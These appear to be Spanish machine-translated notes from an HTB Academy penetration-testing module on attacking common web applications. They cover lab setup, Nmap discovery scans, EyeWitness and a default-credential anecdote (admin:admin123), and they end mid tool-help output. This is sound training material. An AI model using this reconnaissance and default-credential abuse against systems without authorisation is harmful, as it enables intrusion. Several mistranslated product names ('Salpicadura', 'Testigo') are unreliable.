---
tags:
  - HTB-Academy
  - Penetration-Tester
---


# Introducción al Ataque de Aplicaciones Comunes

---

Las aplicaciones basadas en la web prevalecen en la mayoría, si no en todos los entornos que encontramos como probadores de penetración. Durante nuestras evaluaciones, nos encontraremos con una amplia variedad de aplicaciones web como Sistemas de Gestión de Contenido (CMS), aplicaciones web personalizadas, portales de intranet utilizados por desarrolladores y administradores de sistemas, repositorios de código, herramientas de monitoreo de red, sistemas de venta de entradas, wikis, bases de conocimiento, rastreadores de problemas, aplicaciones de contenedores de servlets y más. Es común encontrar las mismas aplicaciones en muchos entornos diferentes. Si bien una aplicación puede no ser vulnerable en un entorno, puede estar mal configurada o sin parches en el siguiente. Un asesor debe tener una comprensión firme de enumerar y atacar las aplicaciones comunes cubiertas en este módulo.

Las aplicaciones web son aplicaciones interactivas a las que se puede acceder a través de navegadores web. Las aplicaciones web generalmente adoptan una arquitectura cliente-servidor para ejecutar y manejar interacciones. Por lo general, se componen de componentes front-end (la interfaz del sitio web, o "lo que el usuario ve") que se ejecutan en el lado del cliente (navegador) y otros componentes back-end (código fuente de la aplicación web) que se ejecutan en el lado del servidor (servidor back-end/bases de datos). Para un estudio en profundidad de la estructura y función de las aplicaciones web, consulte el [Introducción a las Aplicaciones Web](https://academy.hackthebox.com/course/preview/introduction-to-web-applications) módulo.

Todos los tipos de aplicaciones web (comerciales, de código abierto y personalizadas) pueden sufrir los mismos tipos de vulnerabilidades y configuraciones erróneas, es decir, los 10 principales riesgos de aplicaciones web cubiertos en el [Top 10 OWASP](https://owasp.org/www-project-top-ten/). Si bien podemos encontrar versiones vulnerables de muchas aplicaciones comunes que sufren vulnerabilidades conocidas (públicas) como inyección SQL, XSS, errores de ejecución remota de código, lectura de archivos locales y carga de archivos sin restricciones, es igualmente importante para nosotros comprender cómo podemos abusar de la funcionalidad incorporada de muchas de estas aplicaciones para lograr la ejecución remota de código.

A medida que las organizaciones continúan endureciendo su perímetro externo y limitando los servicios expuestos, las aplicaciones web se están convirtiendo en un objetivo más atractivo para los actores maliciosos y los probadores de penetración por igual. Cada vez más empresas están haciendo la transición al trabajo remoto y exponiendo (intencionalmente o no) aplicaciones al mundo exterior. Las aplicaciones discutidas en este módulo son típicamente tan propensas a ser expuestas en la red externa como la red interna. Estas aplicaciones pueden servir como punto de apoyo en el entorno interno durante una evaluación externa o como punto de apoyo, movimiento lateral o problema adicional para informar a nuestro cliente durante una evaluación interna.

[El estado de la seguridad de la aplicación en 2021](https://blog.barracuda.com/2021/05/18/report-the-state-of-application-security-in-2021/)fue una encuesta de investigación encargada por Barracuda para recopilar información de los tomadores de decisiones relacionados con la seguridad de las aplicaciones. La encuesta incluye respuestas de 750 tomadores de decisiones en empresas con 500 o más empleados en todo el mundo. Los resultados de la encuesta fueron asombrosos: el 72% de los encuestados declaró que su organización sufrió al menos una violación debido a una vulnerabilidad de la aplicación, el 32% sufrió dos infracciones y el 14% sufrió tres. Las organizaciones encuestadas rompieron sus desafíos de la siguiente manera: ataques de bot (43%), ataques de cadena de suministro de software (39%), detección de vulnerabilidades (38%) y seguridad de API (37%). Este módulo se centrará en vulnerabilidades conocidas y configuraciones erróneas en aplicaciones de código abierto y comerciales (versiones gratuitas demostradas en este módulo)que constituyen un gran porcentaje de los ataques exitosos que las organizaciones enfrentan regularmente.

---

## Datos de Aplicación

Este módulo estudiará varias aplicaciones comunes en profundidad mientras cubre brevemente algunas otras menos comunes (pero aún se ven a menudo). Solo algunas de las categorías de aplicaciones que podemos encontrar durante una evaluación determinada que podemos aprovechar para ganar un punto de apoyo o obtener acceso a datos confidenciales incluyen:

|**Categoría**|**Aplicaciones**|
|---|---|
|[Gestión de Contenidos Web](https://enlyft.com/tech/web-content-management)|Joomla, Drupal, WordPress, DotNetNuke, etc.|
|[Servidores de Aplicaciones](https://enlyft.com/tech/application-servers)|Apache Tomcat, Phusion Passenger, Oracle WebLogic, IBM WebSphere, etc.|
|[Información de Seguridad y Gestión de Eventos (SIEM)](https://enlyft.com/tech/security-information-and-event-management-siem)|Splunk, Trustwave, LogRhythm, etc.|
|[Gestión de Redes](https://enlyft.com/tech/network-management)|PRTG Network Monitor, ManageEngine Opmanger, etc.|
|[Gestión de TI](https://enlyft.com/tech/it-management-software)|Nagios, Puppet, Zabbix, ManageEngine ServiceDesk Plus, etc.|
|[Marcos de Software](https://enlyft.com/tech/software-frameworks)|JBoss, Axis2, etc.|
|[Gestión de Servicio al Cliente](https://enlyft.com/tech/customer-service-management)|osTicket, Zendesk, etc.|
|[Motores de Búsqueda](https://enlyft.com/tech/search-engines)|Elasticsearch, Apache Solr, etc.|
|[Gestión de Configuración de Software](https://enlyft.com/tech/software-configuration-management)|Atlassian JIRA, GitHub, GitLab, Bugzilla, Bugsnag, Bitbucket, etc.|
|[Herramientas de Desarrollo de Software](https://enlyft.com/tech/software-development-tools)|Jenkins, Atlassian Confluence, phpMyAdmin, etc.|
|[Integración de Aplicaciones Empresariales](https://enlyft.com/tech/enterprise-application-integration)|Oracle Fusion Middleware, BizTalk Server, Apache ActiveMQ, etc.|

Como puede ver navegando por los enlaces para cada categoría anterior, hay [miles de aplicaciones](https://enlyft.com/tech/) que podemos encontrar durante una evaluación determinada. Muchos de estos sufren exploits conocidos públicamente o tienen una funcionalidad que se puede abusar para obtener la ejecución remota de código, robar credenciales o acceder a información confidencial con o sin credenciales válidas. Este módulo cubrirá las aplicaciones más frecuentes que vemos repetidamente durante las evaluaciones internas y externas.

Echemos un vistazo al sitio web de Enlyft. Podemos ver, por ejemplo, que pudieron recopilar datos sobre más de 3,7 millones de empresas que están utilizando [WordPress](https://enlyft.com/tech/products/wordpress) lo que representa casi el 70% de la cuota de mercado en todo el mundo para las aplicaciones de Gestión de Contenido Web para todas las empresas encuestadas. Para la herramienta SIEM [Salpicadura](https://enlyft.com/tech/products/splunk) fue utilizado por 22.174 de las empresas encuestadas y representó casi el 30% de la cuota de mercado de las herramientas SIEM. Si bien las aplicaciones restantes que cubriremos representan una cuota de mercado mucho menor para su categoría respectiva, todavía las veo a menudo, y las habilidades aprendidas aquí se pueden aplicar a muchas situaciones diferentes.

Mientras trabaja en la sección de ejemplos, preguntas y evaluaciones de habilidades, haga un esfuerzo concertado para aprender cómo funcionan estas aplicaciones y _por qué_ existen vulnerabilidades y configuraciones erróneas específicas en lugar de simplemente reproducir los ejemplos para moverse rápidamente a través del módulo. Estas habilidades lo beneficiarán enormemente y probablemente podrían ayudarlo a identificar rutas de ataque en diferentes aplicaciones que encuentre durante una evaluación por primera vez. Todavía encuentro aplicaciones que solo he visto algunas veces o nunca antes, y abordarlas con esta mentalidad a menudo me ha ayudado a lograr ataques o encontrar una manera de abusar de la funcionalidad incorporada.

---

## Una Historia Rápida

Por ejemplo, durante una prueba de penetración externa, me encontré con el [Aplicación OSS Nexus Repository](https://www.sonatype.com/products/repository-oss) de Sonatype, que nunca había visto antes. Rápidamente descubrí que las credenciales de administrador predeterminadas de `admin:admin123` para esa versión no se había cambiado, y pude iniciar sesión y analizar la funcionalidad de administración. En esta versión, aproveché la API como usuario autenticado para obtener la ejecución remota de código en el sistema. Encontré esta aplicación en otra evaluación, pude iniciar sesión con credenciales predeterminadas una vez más. Esta vez fue capaz de abusar del [Tareas](https://help.sonatype.com/en/tasks.html#UUID-53669de9-914f-58da-0ba3-9e129cd2e3de_id_Tasks-Admin-Executescript) funcionalidad (que se deshabilitó la primera vez que encontré esta aplicación) y escribir un rápido [Groovy](https://groovy-lang.org/) [guión](https://help.sonatype.com/en/writing-scripts.html) en la sintaxis de Java para ejecutar un script y obtener la ejecución remota de código. Esto es similar a cómo abusaremos de los Jenkins [consola de script](https://www.jenkins.io/doc/book/managing/script-console/) más adelante en este módulo. He encontrado muchas otras aplicaciones, como [OpManager](https://www.manageengine.com/products/applications_manager/me-opmanager-monitoring.html) desde ManageEngine que le permite ejecutar un script como el usuario en el que se ejecuta la aplicación (generalmente la poderosa cuenta NT AUTHORITY\SYSTEM) y obtener un punto de apoyo. Nunca debemos pasar por alto las aplicaciones durante una evaluación interna y externa, ya que pueden ser nuestra única forma de "entrar" en un entorno relativamente bien mantenido.

---

## Aplicaciones Comunes

Normalmente me encuentro con al menos una de las aplicaciones a continuación, que cubriremos en profundidad en todas las secciones del módulo. Si bien no podemos cubrir todas las aplicaciones posibles que podamos encontrar, las habilidades que se enseñan en este módulo nos prepararán para abordar todas las aplicaciones con un ojo crítico y evaluarlas en busca de vulnerabilidades públicas y configuraciones erróneas.

|Aplicación|Descripción|
|---|---|
|WordPress|[WordPress](https://wordpress.org/) es un Sistema de Gestión de Contenido (CMS) de código abierto que se puede utilizar para múltiples propósitos. A menudo se usa para alojar blogs y foros. WordPress es altamente personalizable y amigable con SEO, lo que lo hace popular entre las empresas. Sin embargo, su personalización y naturaleza extensible lo hacen propenso a vulnerabilidades a través de temas y complementos de terceros. WordPress está escrito en PHP y generalmente se ejecuta en Apache con MySQL como backend.|
|Drupal|[Drupal](https://www.drupal.org/) es otro CMS de código abierto que es popular entre las empresas y desarrolladores. Drupal está escrito en PHP y admite el uso de MySQL o PostgreSQL para el backend. Además, SQLite se puede utilizar si no hay DBMS instalado. Al igual que WordPress, Drupal permite a los usuarios mejorar sus sitios web mediante el uso de temas y módulos.|
|Joomla|[Joomla](https://www.joomla.org/) es otro CMS de código abierto escrito en PHP que normalmente usa MySQL, pero se puede hacer para ejecutarse con PostgreSQL o SQLite. Joomla se puede utilizar para blogs, foros de discusión, comercio electrónico y más. Joomla se puede personalizar mucho con temas y extensiones y se estima que es el tercer CMS más utilizado en Internet después de WordPress y Shopify.|
|Tomcat|[Tomcat Apache](https://tomcat.apache.org/) es un servidor web de código abierto que aloja aplicaciones escritas en Java. Tomcat fue diseñado inicialmente para ejecutar Java Servlets y Java Server Pages (JSP) scripts. Sin embargo, su popularidad aumentó con los marcos basados en Java y ahora es ampliamente utilizado por marcos como Spring y herramientas como Gradle.|
|Jenkins|[Jenkins](https://jenkins.io/) es un servidor de automatización de código abierto escrito en Java que ayuda a los desarrolladores a construir y probar sus proyectos de software continuamente. Es un sistema basado en servidor que se ejecuta en contenedores de servlets como Tomcat. A lo largo de los años, los investigadores han descubierto varias vulnerabilidades en Jenkins, incluidas algunas que permiten la ejecución remota de código sin requerir autenticación.|
|Salpicadura|Splunk es una herramienta de análisis de registros utilizada para recopilar, analizar y visualizar datos. Aunque originalmente no estaba destinado a ser una herramienta SIEM, Splunk se usa a menudo para monitoreo de seguridad y análisis de negocios. Las implementaciones de Splunk a menudo se utilizan para albergar datos confidenciales y podrían proporcionar una gran cantidad de información para un atacante si se ven comprometidas. Históricamente, Splunk no ha sufrido una cantidad considerable de vulnerabilidades conocidas aparte de una vulnerabilidad de divulgación de información ([CVE-2018-11409](https://nvd.nist.gov/vuln/detail/CVE-2018-11409)), y una vulnerabilidad de ejecución remota de código autenticada en versiones muy antiguas ([CVE-2011-4642](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4642)).|
|Monitor de red PRTG|[Monitor de red PRTG](https://www.paessler.com/prtg) es un sistema de monitoreo de red sin agente que se puede usar para monitorear métricas como el tiempo de actividad, el uso de ancho de banda y más desde una variedad de dispositivos como enrutadores, conmutadores, servidores, etc. Utiliza un modo de autodescubrimiento para escanear una red y luego aprovecha protocolos como ICMP, WMI, SNMP y NetFlow para comunicarse y recopilar datos de dispositivos descubiertos. PRTG está escrito en [Delfos](https://en.wikipedia.org/wiki/Delphi_\(software\)).|
|osTicket|[osTicket](https://osticket.com/) es un sistema de venta de entradas de soporte de código abierto ampliamente utilizado. Se puede utilizar para administrar los tickets de servicio al cliente recibidos por correo electrónico, teléfono y la interfaz web. osTicket está escrito en PHP y puede ejecutarse en Apache o IIS con MySQL como backend.|
|GitLab|[GitLab](https://about.gitlab.com/) es una plataforma de desarrollo de software de código abierto con un administrador de repositorios Git, control de versiones, seguimiento de problemas, revisión de código, integración e implementación continuas y más. Originalmente fue escrito en Ruby, pero ahora utiliza Ruby on Rails, Go y Vue.js. GitLab ofrece versiones comunitarias (gratuitas) y empresariales del software.|

---

## Objetivos del Módulo

A lo largo de las secciones del módulo, nos referiremos a URL como `http://app.inlanefreight.local`. Para simular un entorno grande y realista con múltiples servidores web, utilizamos Vhosts para alojar las aplicaciones web. Dado que todos estos Vhosts se asignan a un directorio diferente en el mismo host, tenemos que hacer entradas manuales en nuestro `/etc/hosts` archivo en el Pwnbox o VM de ataque local para interactuar con el laboratorio. Esto debe hacerse para cualquier ejemplo que muestre escaneos o capturas de pantalla utilizando un FQDN. Secciones como Splunk que solo usan la dirección IP del destino generado no requerirán una entrada de archivo de hosts, y solo puede interactuar con la dirección IP generada y el puerto asociado.

Para hacer esto rápidamente, podríamos ejecutar lo siguiente:

  Introducción al Ataque de Aplicaciones Comunes

```shell-session
vcrdcr@htb[/htb]$ IP=10.129.42.195
vcrdcr@htb[/htb]$ printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
```

Después de este comando, nuestro `/etc/hosts` el archivo se vería como el siguiente (en un Pwnbox recién generado):

  Introducción al Ataque de Aplicaciones Comunes

```shell-session
vcrdcr@htb[/htb]$ cat /etc/hosts

# Your system has configured 'manage_etc_hosts' as True.
# As a result, if you wish for changes to this file to persist
# then you will need to either
# a.) make changes to the master file in /etc/cloud/templates/hosts.debian.tmpl
# b.) change or remove the value of 'manage_etc_hosts' in
#     /etc/cloud/cloud.cfg or cloud-config from user-data
#
127.0.1.1 htb-9zftpkslke.htb-cloud.com htb-9zftpkslke
127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts

10.129.42.195	app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local
```

Es posible que desee escribir su propio script o editar el archivo de hosts a mano, lo cual está bien.

Si genera un objetivo durante una sección y no puede acceder a él directamente a través de la IP, ¡asegúrese de verificar su archivo de hosts y actualizar cualquier entrada!

Los ejercicios de módulo que requieren vhosts mostrarán una lista que puede usar para editar su archivo de hosts después de generar la VM de destino en la parte inferior de la sección respectiva.


# Descubrimiento y Enumeración de Aplicaciones

---

Para administrar eficazmente su red, una organización debe mantener (y actualizar continuamente) un inventario de activos que incluya todos los dispositivos conectados a la red (servidores, estaciones de trabajo, dispositivos de red, etc.), software instalado y aplicaciones en uso en todo el entorno. Si una organización no está segura de lo que está presente en su red, ¿cómo sabrá qué proteger y qué agujeros potenciales existen? La organización debe saber si las aplicaciones están instaladas localmente o alojadas por un tercero, su nivel de parche actual, si están en o cerca del final de su vida útil, pueden detectar cualquier aplicación deshonesta en la red (o "shadow IT") y tienen suficiente visibilidad en cada aplicación para garantizar que estén adecuadamente aseguradas con contraseñas sólidas (no predeterminadas), e idealmente la autenticación multifactor está habilitada.Ciertas aplicaciones tienen portales administrativos que pueden restringirse a solo ser accesibles desde direcciones IP específicas o desde el propio host (localhost).

La realidad es que muchas organizaciones no lo saben todo en su red, y algunas organizaciones tienen muy poca visibilidad, y podemos ayudarles con esto. La enumeración que realizamos puede ser altamente beneficiosa para nuestros clientes para ayudarlos a mejorar o comenzar a construir un inventario de activos. Es muy probable que identifiquemos aplicaciones que han sido olvidadas, versiones de demostración de software que tal vez hayan tenido su licencia de prueba caducada y convertida a una versión que no requiere autenticación (en el caso de Splunk), aplicaciones con credenciales predeterminadas/débiles, aplicaciones no autorizadas/configuradas y aplicaciones que sufren vulnerabilidades públicas. Podemos proporcionar estos datos a nuestros clientes como una combinación de los hallazgos en nuestros informes (es decir, una aplicación con credenciales predeterminadas `admin:admin`, como apéndices tales como una lista de servicios identificados mapeados a hosts, o datos de escaneo suplementarios). Incluso podemos dar un paso más y educar a nuestros clientes sobre algunas de las herramientas que utilizamos a diario para que puedan comenzar a realizar un reconocimiento periódico y proactivo de sus redes y encontrar brechas antes de que los probadores de penetración, o peor aún, los atacantes, las encuentren primero.

Como probadores de penetración, necesitamos tener fuertes habilidades de enumeración y poder obtener la "posición de la tierra" en cualquier red comenzando con muy poca o ninguna información (descubrimiento de caja negra o simplemente un conjunto de rangos CIDR). Por lo general, cuando nos conectamos a una red, comenzaremos con un barrido de ping para identificar "hosts en vivo." A partir de ahí, generalmente comenzaremos el escaneo de puertos específicos y, eventualmente, un escaneo de puertos más profundo para identificar los servicios en ejecución. En una red con cientos o miles de hosts, estos datos de enumeración pueden volverse difíciles de manejar. Digamos que realizamos un escaneo de puertos Nmap para identificar servicios web comunes como:

#### Mapa - Web Discovery

  Descubrimiento y Enumeración de Aplicaciones

```shell-session
vcrdcr@htb[/htb]$ nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```

Podemos encontrar una enorme cantidad de hosts con servicios que se ejecutan solo en los puertos 80 y 443. ¿Qué hacemos con estos datos? Examinar los datos de enumeración a mano en un entorno grande llevaría demasiado tiempo, especialmente porque la mayoría de las evaluaciones están bajo estrictas limitaciones de tiempo. Navegar a cada puerto IP/nombre de host + también sería altamente ineficiente.

Por suerte para nosotros, existen varias herramientas excelentes que pueden ayudar mucho en este proceso. Dos herramientas fenomenales que cada probador debe tener en su arsenal son [Testigo](https://github.com/FortyNorthSecurity/EyeWitness) y [Aquatone](https://github.com/michenriksen/aquatone). Ambas herramientas pueden ser alimentadas con salida de escaneo Nmap XML sin procesar (Aquatone también puede tomar Masscan XML; EyeWitness puede tomar la salida Nessus XML) y se pueden usar para inspeccionar rápidamente todos los hosts que ejecutan aplicaciones web y tomar capturas de pantalla de cada uno. Las capturas de pantalla se ensamblan en un informe que podemos trabajar en el navegador web para evaluar la superficie del ataque web.

Estas capturas de pantalla pueden ayudarnos a reducir potencialmente 100s de hosts y construir una lista más específica de aplicaciones que deberíamos pasar más tiempo enumerando y atacando. Estas herramientas están disponibles tanto para Windows como para Linux, por lo que podemos utilizarlas en lo que elijamos para nuestro cuadro de ataque en un entorno determinado. Recorremos algunos ejemplos de cada uno para crear un inventario de aplicaciones presentes en el objetivo `INLANEFREIGHT.LOCAL` dominio.

---

## Organizar

Aunque cubriremos la toma de notas, los informes y la documentación en un módulo separado, vale la pena aprovechar la oportunidad para seleccionar una aplicación de toma de notas si no lo hemos hecho y comenzar a configurarla para registrar mejor los datos que estamos recopilando en esta fase. El módulo [Empezando](https://academy.hackthebox.com/course/preview/getting-started) discute varias aplicaciones de toma de notas. Si no ha elegido uno en este punto, sería un excelente momento para comenzar. Herramientas como OneNote, Evernote, Notion, Cherrytree, etc., son todas buenas opciones, y todo se reduce a las preferencias personales. Independientemente de la herramienta que elija, deberíamos estar trabajando en nuestra metodología de toma de notas en este momento y crear plantillas que podamos usar en nuestra herramienta de elección configurada para cada tipo de evaluación.

Para esta sección, desglosaría el `Enumeration & Discovery` sección de mi cuaderno en un separado `Application Discovery`sección. Aquí crearía subsecciones para el alcance, escaneos (Nmap, Nessus, Masscan, etc.), captura de pantalla de aplicaciones y hosts interesantes/notables para profundizar más más adelante. Es importante marcar la hora y la fecha en cada escaneo que realizamos y guardar todas las salidas y la sintaxis de escaneo exacta que se realizó y los hosts objetivo. Esto puede ser útil más adelante si el cliente tiene alguna pregunta sobre la actividad que vio durante la evaluación. Estar organizado desde el principio y mantener registros y notas detallados nos ayudará mucho con el informe final. Por lo general, configuro el esqueleto del informe al comienzo de la evaluación junto con mi cuaderno para poder comenzar a completar ciertas secciones del informe mientras espero que finalice un escaneo. Todo esto ahorrará tiempo al final del compromisodéjenos más tiempo para las cosas divertidas (¡prueba de configuraciones erróneas y exploits!), y asegúrese de que somos lo más minuciosos posible.

Un ejemplo de estructura OneNote (también aplicable a otras herramientas) puede parecerse a lo siguiente para la fase de descubrimiento:

`External Penetration Test - <Client Name>`

- `Scope`(incluidas las direcciones/rangos IP dentro del alcance, las URL, los hosts frágiles, los plazos de prueba y cualquier limitación u otra información relativa que necesitemos a mano)
    
- `Client Points of Contact`
    
- `Credentials`
    
- `Discovery/Enumeration`
    
    - `Scans`
        
    - `Live hosts`
        
- `Application Discovery`
    
    - `Scans`
    - `Interesting/Notable Hosts`
- `Exploitation`
    
    - `<Hostname or IP>`
        
    - `<Hostname or IP>`
        
- `Post-Exploitation`
    
    - `<Hostname or IP>`
        
    - `<<Hostname or IP>`
        

Nos referiremos a esta estructura en todo el módulo, por lo que sería un ejercicio muy beneficioso replicar esto y registrar todo nuestro trabajo en este módulo como si estuviéramos trabajando a través de un compromiso real. Esto nos ayudará a refinar nuestra metodología de documentación, una habilidad esencial para un probador de penetración exitoso. Tener notas a las que referirnos de cada sección será útil cuando lleguemos a las tres evaluaciones de habilidades al final del módulo y será extremadamente útil a medida que avancemos en el `Penetration Tester` camino.

---

## Enumeración Inicial

Supongamos que nuestro cliente nos proporcionó el siguiente alcance:

  Descubrimiento y Enumeración de Aplicaciones

```shell-session
vcrdcr@htb[/htb]$ cat scope_list 

app.inlanefreight.local
dev.inlanefreight.local
drupal-dev.inlanefreight.local
drupal-qa.inlanefreight.local
drupal-acc.inlanefreight.local
drupal.inlanefreight.local
blog-dev.inlanefreight.local
blog.inlanefreight.local
app-dev.inlanefreight.local
jenkins-dev.inlanefreight.local
jenkins.inlanefreight.local
web01.inlanefreight.local
gitlab-dev.inlanefreight.local
gitlab.inlanefreight.local
support-dev.inlanefreight.local
support.inlanefreight.local
inlanefreight.local
10.129.201.50
```

Podemos comenzar con un escaneo Nmap de puertos web comunes. Normalmente haré un escaneo inicial con puertos `80,443,8000,8080,8180,8888,10000` y luego ejecute EyeWitness o Aquatone (o ambos dependiendo de los resultados del primero) contra este escaneo inicial. Al revisar el informe de captura de pantalla de los puertos más comunes, puedo ejecutar un escaneo Nmap más completo contra los 10,000 puertos principales o todos los puertos TCP, dependiendo del tamaño del alcance. Dado que la enumeración es un proceso iterativo, ejecutaremos una herramienta de captura de pantalla web contra cualquier escaneo Nmap posterior que realicemos para garantizar la máxima cobertura.

En una prueba de penetración de alcance completo no evasiva, generalmente también ejecutaré un escaneo Nessus para darle al cliente la mayor cantidad de dinero, pero debemos poder realizar evaluaciones sin depender de las herramientas de escaneo. A pesar de que la mayoría de las evaluaciones son limitadas en el tiempo (y a menudo no se toman adecuadamente para el tamaño del entorno), podemos proporcionar a nuestros clientes el máximo valor mediante el establecimiento de una metodología de enumeración repetible y completa que se puede aplicar a todos los entornos que cubrimos. Necesitamos ser eficientes durante la etapa de recopilación/descubrimiento de información sin tomar atajos que podrían dejar fallas críticas sin descubrir. La metodología y las herramientas preferidas de todos variarán un poco, y debemos esforzarnos por crear una que funcione bien para nosotros mientras llegamos al mismo objetivo final.

Todos los escaneos que realizamos durante un compromiso no evasivo son para recopilar datos como entradas a nuestro proceso manual de validación y prueba manual. No debemos confiar únicamente en los escáneres, ya que el elemento humano en las pruebas de penetración es esencial. A menudo encontramos las vulnerabilidades y configuraciones erróneas más únicas y graves solo a través de pruebas manuales exhaustivas.

Vamos a profundizar en la lista de alcance mencionada anteriormente con un escaneo Nmap que normalmente descubrirá la mayoría de las aplicaciones web en un entorno. Por supuesto, realizaremos escaneos más profundos más adelante, pero esto nos dará un buen punto de partida.

Nota: No todos los hosts en la lista de alcance anterior serán accesibles al generar el objetivo a continuación. Habrá ejercicios separados, similares, al final de esta sección para reproducir gran parte de lo que se muestra aquí.

  Descubrimiento y Enumeración de Aplicaciones

```shell-session
vcrdcr@htb[/htb]$ sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list 

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-07 21:49 EDT
Stats: 0:00:07 elapsed; 1 hosts completed (4 up), 4 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 81.24% done; ETC: 21:49 (0:00:01 remaining)

Nmap scan report for app.inlanefreight.local (10.129.42.195)
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)
Host is up (0.12s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
8009/tcp open  ajp13
8080/tcp open  http-proxy
8180/tcp open  unknown
8888/tcp open  sun-answerbook

Nmap scan report for gitlab-dev.inlanefreight.local (10.129.201.88)
Host is up (0.12s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8081/tcp open  blackice-icecap

Nmap scan report for 10.129.201.50
Host is up (0.13s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
8000/tcp open  http-alt
8080/tcp open  http-proxy
8089/tcp open  unknown

<SNIP>
```

Como podemos ver, identificamos varios hosts que ejecutan servidores web en varios puertos. A partir de los resultados, podemos inferir que uno de los hosts es Windows y el resto son Linux (pero no puede estar 100% seguro en esta etapa). Preste especial atención a los nombres de host también. En este laboratorio, estamos utilizando Vhosts para simular los subdominios de una empresa. Anfitriones con `dev` como parte del FQDN vale la pena anotarlo, ya que pueden estar ejecutando funciones no probadas o tener habilitado el modo de depuración. A veces los nombres de host no nos dicen demasiado, como `app.inlanefreight.local`. Podemos inferir que es un servidor de aplicaciones, pero tendríamos que realizar una enumeración adicional para identificar qué aplicación(s) se están ejecutando en él.

También nos gustaría agregar `gitlab-dev.inlanefreight.local` a nuestra lista de "hosts interesantes" para profundizar una vez que completemos la fase de descubrimiento. Es posible que podamos acceder a repositorios públicos de Git que podrían contener información confidencial, como credenciales o pistas que pueden llevarnos a otros subdominios/Vhosts. No es raro encontrar instancias de Gitlab que nos permitan registrar un usuario sin requerir la aprobación del administrador para activar la cuenta. Podemos encontrar repos adicionales después de iniciar sesión. También valdría la pena verificar las confirmaciones anteriores para datos como credenciales que cubriremos más detalladamente más adelante en este módulo cuando profundicemos en Gitlab.

Enumerar uno de los hosts adicionalmente usando un escaneo de servicio Nmap (`-sV`) contra los 1.000 puertos principales predeterminados puede decirnos más sobre lo que se está ejecutando en el servidor web.

  Descubrimiento y Enumeración de Aplicaciones

```shell-session
vcrdcr@htb[/htb]$ sudo nmap --open -sV 10.129.201.50

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-07 21:58 EDT
Nmap scan report for 10.129.201.50
Host is up (0.13s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  http          Splunkd httpd
8080/tcp open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp open  ssl/http      Splunkd httpd (free license; remote login disabled)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.63 seconds
```

Desde la salida anterior, podemos ver que un servidor web IIS se está ejecutando en el puerto predeterminado 80, y parece que `Splunk` se ejecuta en el puerto 8000/8089, mientras `PRTG Network Monitor` está presente en el puerto 8080. Si estuviéramos en un entorno de tamaño mediano a grande, este tipo de enumeración sería ineficiente. Podría hacer que nos falte una aplicación web que puede resultar crítica para el éxito del compromiso.

---

## Usando EyeWitness

Primero está EyeWitness. Como se mencionó anteriormente, EyeWitness puede tomar la salida XML de Nmap y Nessus y crear un informe con capturas de pantalla de cada aplicación web presente en los diversos puertos utilizando Selenium. También llevará las cosas un paso más allá y categorizará las aplicaciones cuando sea posible, las tomará con las huellas dactilares y sugerirá credenciales predeterminadas basadas en la aplicación. También se le puede dar una lista de direcciones IP y URL y se le puede pedir que se ponga previamente `http://` y `https://` al frente de cada uno. Realizará la resolución DNS para las IP y se le puede dar un conjunto específico de puertos para intentar conectarse y capturar pantalla.

Podemos instalar EyeWitness a través de apt:

  Descubrimiento y Enumeración de Aplicaciones

```shell-session
vcrdcr@htb[/htb]$ sudo apt install eyewitness
```

o clonar el [repositorio](https://github.com/FortyNorthSecurity/EyeWitness), navega hacia el `Python/setup` directorio y ejecutar el `setup.sh` script de instalador. EyeWitness también se puede ejecutar desde un contenedor Docker, y una versión de Windows está disponible, que se puede compilar utilizando Visual Studio.

Corriendo `eyewitness -h` nos mostrará las opciones disponibles para nosotros:

  Descubrimiento y Enumeración de Aplicaciones

```shell-session
vcrdcr@htb[/htb]$ eyewitness -h

usage: EyeWitness.py [--web] [-f Filename] [-x Filename.xml]
                     [--single Single URL] [--no-dns] [--timeout Timeout]
                     [--jitter # of Seconds] [--delay # of Seconds]
                     [--threads # of Threads]
                     [--max-retries Max retries on a timeout]
                     [-d Directory Name] [--results Hosts Per Page]
                     [--no-prompt] [--user-agent User Agent]
                     [--difference Difference Threshold]
                     [--proxy-ip 127.0.0.1] [--proxy-port 8080]
                     [--proxy-type socks5] [--show-selenium] [--resolve]
                     [--add-http-ports ADD_HTTP_PORTS]
                     [--add-https-ports ADD_HTTPS_PORTS]
                     [--only-ports ONLY_PORTS] [--prepend-https]
                     [--selenium-log-path SELENIUM_LOG_PATH] [--resume ew.db]
                     [--ocr]

EyeWitness is a tool used to capture screenshots from a list of URLs

Protocols:
  --web                 HTTP Screenshot using Selenium

Input Options:
  -f Filename           Line-separated file containing URLs to capture
